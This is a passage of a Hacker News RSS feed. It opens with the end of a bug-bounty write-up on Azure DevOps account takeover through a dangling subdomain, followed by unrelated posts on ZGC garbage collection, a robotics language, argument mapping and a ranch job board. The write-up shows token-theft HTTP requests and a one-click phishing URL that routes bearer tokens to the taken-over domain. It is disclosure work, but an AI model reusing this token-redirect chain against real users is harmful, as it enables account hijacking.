Accept: application/json;api-version=6.0-preview.1;excludeUrls=true
X-Requested-With: XMLHttpRequest
...omitted for brevity...
Cookie: UserAuthentication=&lt;snipped id_token&gt;; FedAuth=&lt;snipped FedAuth&gt;; FedAuth1=&lt;snipped&gt;

{"appId":"00000000-0000-0000-0000-000000000000","force":false,"tokenType":0,"namedTokenId":"Aex.Profile"}
</code></pre>

<p>This request returns the following response with a valid bearer token that can be used elsewhere</p>

<pre><code>HTTP/1.1 200 OK
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Length: 933
Content-Type: application/json; charset=utf-8; api-version=6.0-preview.1
...omitted for brevity...

{"appId":"00000000-0000-0000-0000-000000000000","token":"&lt;snip&gt;","tokenType":"session","validTo":"2020-05-12T06:45:47.2007474Z","namedTokenId":"Aex.Profile"}
</code></pre>

<p>e.g. on <code>app.vsaex.visualstudio.com</code> this token can be used to pull the user’s email</p>

<pre><code>GET /_apis/User/User HTTP/1.1
Host: app.vsaex.visualstudio.com
Connection: close
X-TFS-FedAuthRedirect: Suppress
X-VSS-ReauthenticationAction: Suppress
X-Requested-With: XMLHttpRequest
Accept-Language: en-US
Authorization: Bearer &lt;snip just recieved bearer token&gt;
Accept: application/json;api-version=6.0-preview.1;excludeUrls=true
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
X-TFS-Session: ab1e4b56-599c-4ab6-9f5e-756c486a0f2b
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: https://app.vsaex.visualstudio.com/me?mkt=en-US
Accept-Encoding: gzip, deflate


HTTP/1.1 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Length: 258
...omitted for brevity...

{"descriptor":"msa.NTg0Zjc4NDAtYzc5ZC03MWU0LWJkN2ItMDZhY2Y1N2Q2OTA1","displayName":"s","mail":"&lt;account_email&gt;","unconfirmedMail":null,"country":"AU","dateCreated":"2018-05-25T23:19:53.6843383+00:00","lastModified":"2019-01-06T15:43:50.2963651+00:00","revision":0}
</code></pre>

<p>The Bearer token could be used to access <code>https://app.vsaex.visualstudio.com/me?mkt=en-US</code> which we found to disclose project names for the associated user on <code>dev.azure.com</code>.</p>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-1.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Access to <code>app.vsaex.visualstudio.com/me</code> through the stolen token</em></td>
    </tr>
  </tbody>
</table>



<p>Ultimately, this allowed us to use the token on <code>dev.azure.com</code> to access resources:</p>

<pre><code>GET /seanyeoh/_usersSettings/keys?__rt=fps&amp;__ver=2 HTTP/1.1
Host: dev.azure.com
Connection: close
x-tfs-fedauthredirect: Suppress
Origin: https://dev.azure.com
x-vss-reauthenticationaction: Suppress
authorization: Bearer &lt;snip&gt;
accept: application/json;api-version=5.0-preview.1;excludeUrls=true;enumsAsNumbers=true;msDateFormat=true;noArrayWrap=true
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

</code></pre>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-2.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Accessing resources from dev.azure.com with the generated token</em></td>
    </tr>
  </tbody>
</table>



<p>A malicious attacker could perform a 1 click drive by attack on an unsuspecting user by directing them to a URL such as:</p>

<pre><code>https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F&amp;redirect=1&amp;context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90
</code></pre>

<p>This would result in their <code>app.vsaex.visualstudio.com</code> tokens being disclosed.</p>

<p>From this point, the the attacker would have full control over the user’s Azure DevOps account.</p>

<p>Additionally, the zone takeover of project-cascade.visualstudio.com could have beeen used to validate ownership over the <code>project-cascade.visualstudio.com</code> domain, setup MX records to capture emails to <code>*.project-cascade.visualstudio.com</code> and prove ownership to create SSL certificates. This may have resulted in various opportunities for fraud and impersonation of Microsoft services.</p>



<p>This attack could be mitigated at two points:</p>
<ol>
  <li>Not having the dangling dns zone <code>project-cascade.visualstudio.com</code></li>
  <li>Restricting the reply_to url for visualstudio tokens on <code>app.vssps.visualstudio.com</code> to the realm for <code>app.vsaex.visualstudio.com</code></li>
</ol>


<ol>
  <li>20th May 2020 - Report filed</li>
  <li>22nd May 2020 - Issue triaged</li>
  <li>22nd May 2020 - $3000 Bounty Awarded</li>
</ol>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-3.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Bount…</em></td></tr></tbody></table></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/">https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/</a></em></p>]]>
            </description>
            <link>https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23700800</guid>
            <pubDate>Wed, 01 Jul 2020 12:56:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Compact forwarding information for the Z Garbage Collector in the OpenJDK]]>
            </title>
            <description>
<![CDATA[
Score 60 | Comments 8 (<a href="https://news.ycombinator.com/item?id=23700451">thread link</a>) | @pjmlp
<br/>
July 1, 2020 | https://inside.java/2020/06/25/compact-forwarding/ | <a href="https://web.archive.org/web/*/https://inside.java/2020/06/25/compact-forwarding/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="entry"><hr>

<p><em>The work presented here is performed as part of the <a href="https://inside.java/2020/06/12/joint-research-projects/">joint research project between Oracle, Uppsala University and KTH</a>. Follow the blog series here at inside.java to read more about the JVM research performed at the Oracle Development office in Stockholm.</em></p>

<hr>

<p>This is a short description about my work on garbage collection that I did for my master thesis. This work was done in collaboration with <a href="https://www.oracle.com/">Oracle</a> which gave me an opportunity to work with brilliant minds on challenging problems. I want to direct a special shoutout to my mentors at Oracle, <a href="https://inside.java/u/PerLiden/">Per Lidén</a> and <a href="https://inside.java/u/ErikOsterlund/">Erik Österlund</a>.</p>

<p>To allow fast allocation in garbage collected environments, a common approach is to use bump pointer allocation. Bump pointer allocation uses a pointer to the first available byte in memory that is monotonically increased as we continue to allocate objects. While this scheme allows fast allocation it comes with the caveat that the free memory must be kept continuous. To keep the free memory continuous, many garbage collectors move objects around in memory to compact them, thereby avoiding fragmentation, which can be seen in the figure below. This is typically handled in a process where all live objects are moved off of a page which is then free’d. This permits clearing a page in O(live) objects, which is typically a small number (relatively speaking) since most newly created object tend to die pretty quickly.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/heapgc_defrag.png" alt="Defragmentation during GC"></p>

<p>The Z Garbage Collector (ZGC) is a new moving concurrent garbage collector in OpenJDK (the thing that probably runs your Java application) [1, 2]. ZGC moves objects around, to combat memory fragmenation, without stopping the application.
This imposes additional overhead on an application in the form of tracking objects’ movements, so that all pointers to them can eventually be updated to the new locations. Usually in GC parlance this is referred to as forwarding information.</p>

<p>ZGC uses an auxiliary forwarding table – optimised for fast look-up, at the cost of additional memory use. This forwarding table is stored outside of the Java heap, referred as off heap-allocation. Any off-heap allocation or keeping old object after moving them is to be considered as memory overhead since it is strictly needed for the JVM and not the actual Java application. ZGC suffers from pathological cases where the size of its forwarding information can become very large, theoretically, as big as the heap itself. If we dimension an application for the pathological case this would be a waste of resources, since the memory usage is usually significantly less. This can make it hard to determine an application’s memory requirements.</p>

<p>This risk for large memory overhead is not only a theoretical concern, but can be observed in real programs. Below is a plot depicting the memory overhead for an internal benchmark application called BigRamTester at Oracle, which shows 35% memory overhead. The source code for that application can be found in <a href="https://bugs.openjdk.java.net/browse/JDK-8152438">this issue </a> as an attachment.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/bigram.png" alt="Benchmark Revealing Large Memory Overhead"></p>

<p>Storing forwarding information for each relocated object from addresses A (the from-address) to B (the to-address), costs approximately 128 bytes (64 bytes for each from/to-address), can be implemented computationally efficient but at the cost of additional memory overhead (as shown above). As part of my thesis work, we propose a new design for forwarding tables that maps several sparesly populated pages (i.e., with few live objects) onto a single new page in a way that allows the to-address to be calculated using the from-address and liveness information. The design results in a compressed forwarding table that incurs a theoretical worst-case memory overhead of &lt; 3.2%.</p>

<p>In ZGC, there may be contention between application threads and garbage collector threads of relocating objects. The contention results in nondeterministic addresses to which objects are relocated to. The new design requires <em>deterministic addresses</em> so that we can calculate the new address given some set of information. Assume that we have an old page X, whose objects will be relocated to the new page Y. We achieve deterministic addresses, if we copy the objects to Y in the order we encounter them when traversing the live map from the beginning to the end, in ascending order.</p>

<p>The new design divides pages into Q amount of chunks. A chunk holds the amount of preceding living objects <em>before</em> that chunk. To get the size of previously living objects you will use the associated chunk and scan the live map for the addresses who wasn’t covered by the chunk. This allows X to be computed efficiently and allows the old page to be freed as soon as all objects have been relocated, at the cost of some space. An example of dividing a page into chunks is depicted below.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/chunks.png" alt="Chunks"></p>

<p>Each page divider corresponds to one chunk’s live map coverage. In the example, an object to be relocated lives on the third page which covered by the third chunk (the green arrow). To find the address we do not have to scan the previous chunks since the <em>live bytes</em> field is describing the amount of live bytes of all preceding chunks (the red arrow). Finding all living objects (and their size) preceding the green object within the chunk, can be found in the live map (the yellow arrow).</p>

<p>This design results in a simple logic in order to calculate the new address, which in pseudocode would be express as:</p>

<div><div><pre><code><span>inline</span> <span>uintptr_t</span> <span>ZCompactForwarding</span><span>::</span><span>to_address</span><span>(</span><span>uintptr_t</span> <span>from_address</span><span>)</span> <span>{</span>
  <span>uintptr_t</span> <span>to_page_start_address</span>    <span>=</span> <span>to_page_start_address</span><span>(</span><span>from_address</span><span>);</span>
  <span>uintptr_t</span> <span>live_bytes_before_chunks</span> <span>=</span> <span>live_bytes_before_chunks</span><span>(</span><span>from_address</span><span>)</span>
  <span>uintptr_t</span> <span>live_bytes_on_chunks</span>     <span>=</span> <span>live_bytes_on_chunks</span><span>(</span><span>from_address</span><span>);</span>

  <span>return</span>
    <span>to_page_start_address</span> <span>+</span>
    <span>live_bytes_before_chunk</span> <span>+</span>
    <span>live_bytes_on_chunks</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>The implementation was shown to have a maximum of &lt; 3.2% memory overhead. I used the DaCapo benchmarks suite and the SPECjbb2015 benchmark to evaluate the impact of the design on execution time, given that forwarding addresses must now be computated, as opposed to looked up. Naturally, we expected some performance degradation.
The results from the benchmarking show an statistically significant average performance degradation of approximately 2%, for the new design. Notably, many programs in DaCapo were not effected at all. Two DaCapo programs saw performance improvements at 5.69% and 22.42%, respectively, for the new design.</p>

<p>I haven’t implemented all optimizations on my list (yet). But I’m fairly hopeful that decrease in memory footprint and predictable overhead outweighs the increase in execution time, as incidated by the measurements. This could mean that the work you’d just read about will hopefully find its way into OpenJDK. Only time will tell.</p>

<h2 id="references">References</h2>

<p>[1] Lidén P. <a href="https://mail.openjdk.java.net/pipermail/announce/2017-October/000237.html">CFV: New Project: ZGC; 2017</a>.</p>

<p>[2] Lidén P, Karlsson S. <a href="http://openjdk.java.net/jeps/333">JEP 333: ZGC: A Scalable Low-Latency Garbage Collector</a>.</p>
</div></div>]]>
            </description>
            <link>https://inside.java/2020/06/25/compact-forwarding/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23700451</guid>
            <pubDate>Wed, 01 Jul 2020 11:59:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Program “Greppy”, a 2-wheeled robot, using a new robotics language]]>
            </title>
            <description>
<![CDATA[
Score 125 | Comments 25 (<a href="https://news.ycombinator.com/item?id=23696193">thread link</a>) | @tlb
<br/>
June 30, 2020 | https://yoga.dev/timeshared-robots/ | <a href="https://web.archive.org/web/*/https://yoga.dev/timeshared-robots/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>I’ve been wanting to do a Show HN for my robotics developer tool <a href="https://gitlab.com/umbrellaresearch/yoga2/">Yoga Studio</a> for a while.
But given that:</p>
<ul>
  <li>it’s for programming robots</li>
  <li>you probably don’t have a compatible robot</li>
</ul>

<p>it wasn’t something you could immediately play with.</p>

<p><img src="https://yoga.dev/images/greppy1tlb_300px.jpg" width="150" height="317"></p>

<p>Now, you have <strong>remote access to a robot</strong> you can program with it! The 2-wheeled balancing robot (“Greppy”) is sitting in
our California warehouse ready to run your code. You’ll need to download and build
Yoga Studio to control it – see full instructions below.</p>

<p>When you check out the code, it includes an <code>examples/greppy</code> directory with some code to
make the robot balance and drive around. When you start the app and click “Run Live”, it:</p>

<ul>
  <li>Connects to the robot through a port in our firewall.</li>
  <li>Acquires a lock (only one user at a time. Don’t bogart the robot!)</li>
  <li>Uploads <strong>your code</strong> to the robot (start with the example code, but you can hack it up later.)</li>
  <li>The robot compiles and runs your code</li>
  <li>The robot <strong>streams live traces</strong> of all the sensors and computations done by the code, and also a video from a camera looking at the robot.</li>
  <li>You can <strong>drive the robot</strong> with WASD.</li>
  <li>The bottom pane shows the code running, along with <strong>current values for every expression</strong>.</li>
  <li>In the code pane, numerical parameters are overlaid with gui sliders. <strong>You can drag them around and they’re immediately updated on the robot</strong>.</li>
  <li>When you’re done, hit Escape and it’ll download the high-res traces to your machine.</li>
  <li>While viewing a saved trace, you can adjust parameters and it’ll overlay a counterfactual graph of <strong>what the code would have done</strong> with the new parameters.</li>
  <li>The Yoga language is fully <strong>differentiable WRT its parameters</strong> so you can click on an output variable
 (like motor speed) and it’ll tell you what parameters you should change in which direction to affect it.</li>
</ul>

<h3 id="motivation">Motivation</h3>

<p>This is part of a project to make programming robots faster. My experience is that tuning the parameters of
robot control code takes 10x longer than getting the structure of the code right, so I designed a
language + IDE with a single-minded focus on solving the parameter problem. The language is:</p>

<ul>
  <li>Differentiable with respect to its parameters</li>
  <li>Fast (statically typed and compiled)</li>
  <li>Purely functional (no side effects)</li>
  <li>Close enough to C for your editor’s syntax highlighting to work.</li>
</ul>

<p>The compiler extracts anything marked as a parameter into a separate data structure, with a link to the location
in the source code they came from. When the IDE renders the Yoga code, it shows the parameters as sliders.</p>

<table>
  <thead>
    <tr>
      <td> Code Editor </td>
      <td> Yoga Studio </td>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>
        <img src="https://yoga.dev/images/paramdemo_raw.png" width="331" height="123" alt="Parameters as text">
      </td>
      <td>
        <img src="https://yoga.dev/images/paramdemo_yoga.gif" width="316" height="122" alt="Parameters in Yoga Studio">
      </td>
    </tr>
  </tbody>
</table>

<p>Here’s what Yoga Studio looks like when controlling Greppy:</p>

<p><img src="https://yoga.dev/images/ScreenshotAnno@2x.png" width="740" height="485"></p>

<p>Feel free to hack on the code in <a href="https://gitlab.com/umbrellaresearch/yoga2/-/tree/master/examples/greppy">examples/greppy</a>. See if you can make the robot do something cool!</p>

<p>Read more in the <a href="https://yoga.dev/yoga/">Reference Manual</a>.</p>



<p>It should work on either Mac or Linux (Recently tested on Catalina and Ubuntu 19.10 &amp; 20.04).</p>

<div><div><pre><code>git clone <span>--recurse-submodules</span> https://gitlab.com/umbrellaresearch/yoga2.git
<span>cd </span>yoga2
git config submodule.recurse <span>true
</span>make install.deps <span># On Mac, uses Brew. On Linux, apt-get.</span>
make <span>-j8</span>
</code></pre></div></div>

<p>Now fire up the Greppy example code:</p>

<div><div><pre><code>bin/yogastudio examples/greppy/main.yoga
</code></pre></div></div>

<p>Click “Run live on on robot greppy1”.</p>

<p>It’ll then open up the real-time scope, showing live-scrolling graphs of several variables over time. And the video will show the robot starting to balance.</p>

<p>The greppy example code lets you drive the robot from your keyboard with WASD.</p>

<p>Try going to the <code>balance.yoga</code> file, and adjusting the first 2 parameters in the RHS of the assignment to <code>accel</code>. Those are roughly the P and D parameters of the main balance feedback loop. Start with
small adjustments and work up to large ones! The robot is attached to the ceiling with a rope, so you can’t do too much damage.</p>

<p>Hit Esc to end the live session, and switch to the recorded traces it just captured.</p>

<p>You can scroll back and forth in the recorded traces by scrolling left-right with your mouse. You can add or remove traces from the graph with the checkboxes on the left.</p>

<p>While looking at recorded traces, you can still drag parameters, but now rather than updating on the live robot, they <strong>redo the entire run</strong>, overlaying the counterfactual graphs. That is, it shows what the code would have done with the new parameters given the same inputs from the hardware.</p>

<p>To start another run on the hardware, hit Cmd-L (Ctl-L on Linux).</p>

<p>When you’re happy with the parameters, click “Save params” to write them back to the source code. If you’re following the example, that’ll be in the checked out directory under examples/greppy/</p>

<p>Please send any questions to support@yoga.dev</p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://yoga.dev/timeshared-robots/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23696193</guid>
            <pubDate>Tue, 30 Jun 2020 23:52:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Missing Structure in Technical Discussions]]>
            </title>
            <description>
<![CDATA[
Score 159 | Comments 38 (<a href="https://news.ycombinator.com/item?id=23691701">thread link</a>) | @MindGods
<br/>
June 30, 2020 | http://kvark.github.io/tech/arguments/2020/06/30/technical-discussions.html | <a href="https://web.archive.org/web/*/http://kvark.github.io/tech/arguments/2020/06/30/technical-discussions.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>People are amazing creatures. When discussing a complex issue, they are able to keep multiple independent
arguments in their heads, the pieces of supporting and disproving evidence, and can collapse this system
into a concrete solution. We can spend hours navigating through the issue comments on Github, reconstructing
the points of view, and making sense of the discussion. Problem is: we don’t actually want to apply this
superpower and waste time nearly as often.</p>

<h2 id="problem-with-technical-discussions">Problem with technical discussions</h2>

<p>Have you heard of <code>async</code> in Rust? Ever wondered why the core team opted into a completely new syntax for this feature? Let’s dive in and find out! Here is <a href="https://github.com/rust-lang/rust/issues/57640">#57640</a> with 512 comments, kindly asking everyone to check <a href="https://github.com/rust-lang/rust/issues/50547">#50547</a> (with just 308 comments) before expressing their point of view. Following this discussion must have been exhausting. I don’t know how it would be possible to navigate it without the <a href="https://github.com/rust-lang/rust/issues/57640#issuecomment-456624074">summary</a> <a href="https://github.com/rust-lang/rust/issues/57640#issuecomment-456625030">comments</a>.</p>

<p>Another example is the loop syntax in WebGPU. Issue <a href="https://github.com/gpuweb/gpuweb/issues/569">#569</a> has only 70 comments, with multiple attempts to <a href="https://github.com/gpuweb/gpuweb/issues/569#issuecomment-610041440">summarize</a> the discussion in the middle. It would probably take a few hours at the minimum to get a gist of the group reasoning for somebody from the outside. And that doesn’t include the call transcripts.</p>

<p>Github has emojis which allow certain comments to show more support. Unfortunately, our nature is such that comments are getting liked when we agree with them, not when they advance the discussion in a constructive way. They are all over the place and don’t really help.</p>

<p>What would help though is having a non-linear structure for the discussion. Trees! They make following HN and Reddit threads much easier, but they too have problems. Sometimes, a really important comment is buried deep in one of the branches. Plus, trees don’t work well for a dialog, when there is some back-and-forth between people.</p>

<p>That brings us to the point: most technical discussions are <em>terrible</em>. Not in a sense that people can’t make good points and progress through it, but rather that there is no structure to a discussion, and it’s too hard to follow. What I see in reality is a lot of focus from a very few dedicated people, and delegation by the other ones to those focused. Many views get misrepresented, and many perspectives never heard, because the flow of comments quickly filters out most potential participants.</p>

<h2 id="structured-discussion">Structured discussion</h2>

<p>My first stop in the search of a solution was on <a href="https://www.discourse.org/">Discourse</a>. It is successfully used by many communities, including <a href="https://users.rust-lang.org/">Rust users</a>. Unfortunately, it still has linear structure, and doesn’t bring a lot to the table on top of Github. Try following <a href="https://users.rust-lang.org/t/rust-2020-growth/34956">this discussion
</a> about Rust in 2020 for example.</p>

<p>Then I looked at platforms designed specifically for a structured argumentation. One of the most popular today is <a href="https://www.kialo.com/">Kialo</a>. I haven’t done a good evaluation on it, but it seemed that Kialo isn’t targeted at engineers, and it’s a platform that we’d have to register in for use. Wishing to use Markdown with a system like that, I stumbled upon <a href="https://argdown.org/">Argdown</a>, and realized that it concluded my search.</p>

<p>Argdown introduces a syntax for defining the structure of an argument in text. Statements, arguments, propositions, conclusions - it has it all, written simply in your text editor (especially if its VSCode, for which there is a plugin), or in the <a href="https://argdown.org/sandbox/html">playground</a>. It has command-line tools to produce all sorts of derivatives, like dot graphs, web components, JSON, you name it, from an <code>.argdown</code> file. Naturally, formatting with Markdown in it is also supported.</p>

<p>That discovery led me to two questions. (1) - what would an <em>existing</em> debate look like in such a system? And (2) - how could we shift the workflow towards using one?</p>

<p>So I picked the most contentious topic in WebGPU discussions and tried to reconstruct it. Topic was about choosing the shading language, and why SPIR-V wasn’t accepted. It was discussed by the W3C group over the course of 2+ years, and it’s evident that there is <a href="https://github.com/gpuweb/gpuweb/issues/847#issuecomment-642497578">some</a> <a href="https://news.ycombinator.com/item?id=23089745">misunderstanding</a> of why the decision was made to go with WGSL, taking Google’s Tint proposal as a starting point.</p>

<p>I attempted to reconstruct the debate in https://github.com/kvark/webgpu-debate, building the <a href="https://github.com/kvark/webgpu-debate/blob/b28252ea99aef8989858ece09f74dc0758e3d46c/arguments/SPIR-V.argdown">SPIR-V.argdown</a> with the first version of the argumentation graph, solving (1). The repository accepts pull requests that are checked by CI for syntax correctness, inviting everyone to collaborate, solving (2). Moreover, the artifacts are automatically uploaded to Github-pages, rendering the <a href="https://kvark.github.io/webgpu-debate/SPIR-V.component.html">discussion</a> in a way that is easy to explore.</p>

<h2 id="way-forward">Way forward</h2>

<p>I’m excited to have this new way of preserving and growing the structure of a technical debate. We can keep using the code hosting platforms, and arguing on the issues and PR, while solidifying the core points in these <code>.argdown</code> files. I hope to see it applied more widely to the workflows of technical working groups.</p>

  </div>

</article>

      </div>
    </div></div>]]>
            </description>
            <link>http://kvark.github.io/tech/arguments/2020/06/30/technical-discussions.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23691701</guid>
            <pubDate>Tue, 30 Jun 2020 16:22:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[3D Electron Orbitals of Hydrogen]]>
            </title>
            <description>
<![CDATA[
Score 112 | Comments 45 (<a href="https://news.ycombinator.com/item?id=23691547">thread link</a>) | @c0nrad
<br/>
June 30, 2020 | https://blog.c0nrad.io/hydrogen/ | <a href="https://web.archive.org/web/*/https://blog.c0nrad.io/hydrogen/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

    <p id="info">Made with ♥ by <a target="_blank" href="https://blog.c0nrad.io/">c0nrad</a>. <a target="_blank" href="https://github.com/c0nrad/hydrogen">code</a></p>
    

    

    


</div>]]>
            </description>
            <link>https://blog.c0nrad.io/hydrogen/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23691547</guid>
            <pubDate>Tue, 30 Jun 2020 16:11:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Must ride mule to and from work location]]>
            </title>
            <description>
<![CDATA[
Score 249 | Comments 54 (<a href="https://news.ycombinator.com/item?id=23690922">thread link</a>) | @eightturn
<br/>
June 30, 2020 | https://www.deepsouthventures.com/must-ride-mule-to-from-work-location/ | <a href="https://web.archive.org/web/*/https://www.deepsouthventures.com/must-ride-mule-to-from-work-location/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			<p><em>“David, this one, tell me about it …”</em></p>
<p><a href="https://www.deepsouthventures.com/wp-content/uploads/yellowstone-roughriders-3.jpg"><img src="https://www.deepsouthventures.com/wp-content/uploads/yellowstone-roughriders-3-300x220.jpg" alt="" width="300" height="220" srcset="https://www.deepsouthventures.com/wp-content/uploads/yellowstone-roughriders-3-300x220.jpg 300w, https://www.deepsouthventures.com/wp-content/uploads/yellowstone-roughriders-3-725x532.jpg 725w, https://www.deepsouthventures.com/wp-content/uploads/yellowstone-roughriders-3.jpg 750w" sizes="(max-width: 300px) 100vw, 300px"></a>He’d let me look at his domain name portfolio. Not names he owned and parked, but domains he owned &amp; developed. This was another early project of his – a job board solely focused on the ranching industry. All aspects – cattle, outfitters, dude/guest, hunting, and even associated businesses like horseback riding. He’d launched it in 1998, and done an admirable job developing the brand and building an audience. But other projects had hijacked his attention, and the site had become a bit stale. Its revenue had evaporated.</p>
<p>I knew David from a partnership between DudeRanch.com (mine, at the time) &amp; GuestRanches.com (his). We had grouped them together to sell advertising. A handshake deal. Stronger together, we assumed. And we were right. Over the years, we were able to (more than) double revenue by leveraging the authority of our sites as one entity, versus two.</p>
<p>The more we worked together, the more we shared business opportunities with one another. At one point he shared his portfolio with me, <em>and that’s when I discovered <a href="https://www.ranchwork.com/" rel="noopener noreferrer" target="_blank">RanchWork.com</a></em> .</p>
<p>At that time, I’d been poking around for a second project to develop, and came up empty after a year or so of searching. My usual avenue for acquisition, the <a href="https://www.deepsouthventures.com/build-a-side-business/" target="_blank" rel="noopener noreferrer">expiring domain name market</a>, hadn’t yielded anything of value, so my wandering mind lead me to David.</p>
<p>When I uncovered RanchWork, it reminded me of a friend – <a href="http://shanepike.com/" rel="noopener noreferrer" target="_blank">Shane Pike</a> – who’d built, developed, and successfully sold a nursing job board several years before. And from what I remember, he did it solo. The straightforward nature of job boards was attractive – direct, simple, &amp; sans-fluff.</p>
<p>The niche was compelling, so after I slept on it, I pinged David. To see if he’d let me test a project on it. I was already deeply entrenched in the dude ranching industry, so it seemed like a natural extension. The rough idea was this:</p>
<ol>
<li>Point the RanchWork.com nameservers to me, and I’ll cover the costs of re-development, plus oversight &amp; maintenance.</li>
<li>Once developed, I’d allow <em>free</em> job listings for ranchers to encourage a regular stream of postings. </li>
<li>I’d also allow <em>paid</em> listings (which would post at a faster clip, and remain active for a longer period. </li>
<li>To ensure simplicity, I’d avoid any type of login or account creation. If a rancher was hiring, they’d simply fill out a form, enter credit card info (if needed), and submit. Done deal.</li>
<li>David would receive 25% of all job board revenue the site collected; the remaining 75% would fall into my pocket. Ad publisher revenue was also under my wing.</li>
<li>David would continue to own the domain, 100%, outright.</li>
</ol>
<p>What makes it easy (&amp; fun) to work with David is his ‘<em>screw it, let’s do it</em>‘ attitude. I very much admire that about him, as I tend to follow the same outlook on life. And he brought that spirit into this project as well.</p>
<p>So he agreed. And I got to work.</p>
<figure id="attachment_1309" aria-describedby="caption-attachment-1309"><img src="https://www.deepsouthventures.com/wp-content/uploads/peter-askew-david-mccollough-partnership-1-464x700.jpg" alt="David McCollough &amp; Peter Askew" width="464" height="700" srcset="https://www.deepsouthventures.com/wp-content/uploads/peter-askew-david-mccollough-partnership-1-464x700.jpg 464w, https://www.deepsouthventures.com/wp-content/uploads/peter-askew-david-mccollough-partnership-1-199x300.jpg 199w, https://www.deepsouthventures.com/wp-content/uploads/peter-askew-david-mccollough-partnership-1.jpg 477w" sizes="(max-width: 464px) 100vw, 464px"><figcaption id="caption-attachment-1309">David McCollough &amp; Peter Askew (the tall idiot)</figcaption></figure>
<p><em>Now, sure, from the outset, I could have viewed this idea from a defeatist attitude, that being, “What? I’m gonna try to compete with Indeed, SimplyHired, Monster, and the like? They’re VC backed heavyweights… I have no chance.”</em></p>
<p>I rarely approach projects from this mindset. I tend to approach them from the perspective, “what do I have to lose”. And usually, the answer is  “not much”. And then that thought morphs into “let’s see what kinda shit I can stir up”.</p>
<p>So to start, I purchased a $60 job board theme, and took a full week to properly architect the site for mobile devices and seo. I researched competitors. $25 seemed like the average rate for paid job postings, so that became my base price. Another close friend, <a href="https://www.workinsports.com/blog.asp" target="_blank" rel="noopener noreferrer">Brian Clapp</a>, suggested I add a ‘Job Wanted’ listing for folks searching for ranch employment. I was skeptical that need existed, but added it anyway. And then I happily overpaid for the fastest, most reliable WordPress host I could find. </p>
<p>Essentially, the site changed from this:</p>
<p><img src="https://www.deepsouthventures.com/wp-content/uploads/2000s-ranchwork-com-website-min.jpg" alt="early RanchWork.com website" width="764" height="887" srcset="https://www.deepsouthventures.com/wp-content/uploads/2000s-ranchwork-com-website-min.jpg 764w, https://www.deepsouthventures.com/wp-content/uploads/2000s-ranchwork-com-website-min-258x300.jpg 258w, https://www.deepsouthventures.com/wp-content/uploads/2000s-ranchwork-com-website-min-603x700.jpg 603w" sizes="(max-width: 764px) 100vw, 764px"></p>
<p>to this:</p>
<p><img src="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-2014-relaunch-min-768x756-1.jpg" alt="RanchWork.com 2014" width="768" height="756" srcset="https://www.deepsouthventures.com/wp-content/uploads/ranchwork-2014-relaunch-min-768x756-1.jpg 768w, https://www.deepsouthventures.com/wp-content/uploads/ranchwork-2014-relaunch-min-768x756-1-300x295.jpg 300w, https://www.deepsouthventures.com/wp-content/uploads/ranchwork-2014-relaunch-min-768x756-1-700x689.jpg 700w" sizes="(max-width: 768px) 100vw, 768px"></p>
<p>An improvement, I thought. Not perfect, but better. Simpler in a way. </p>
<p>I re-launched the site in October of 2013.</p>
<p>At first, I seeded all the jobs myself. Then ranchers started submitting their own. Then I shifted into curation &amp; verification. </p>
